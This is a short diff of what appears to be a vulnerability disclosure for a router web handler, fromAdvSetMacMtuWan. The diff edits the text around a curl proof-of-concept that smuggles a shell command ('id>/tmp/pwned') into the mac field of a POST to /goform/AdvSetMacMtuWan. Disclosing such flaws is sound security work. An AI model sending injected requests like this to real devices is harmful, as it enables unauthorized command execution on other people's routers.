@@ -14,6 +14,4 @@ In the httpd binary, the function `fromAdvSetMacMtuWan` handles requests to `/go
 curl -i -X POST http://192.168.0.1/goform/AdvSetMacMtuWan -d "wanMTU=1500&wanSpeed=0&cloneType=manual&mac=AA:BB:CC;id>/tmp/pwned"
 ```
 
-Response: `{"errCode":0}` — handler accepts the injected MAC address.
-
-![Handler returns errCode:0 with injected payload](screenshots/2.png)
+![PoC result](screenshots/2.png)
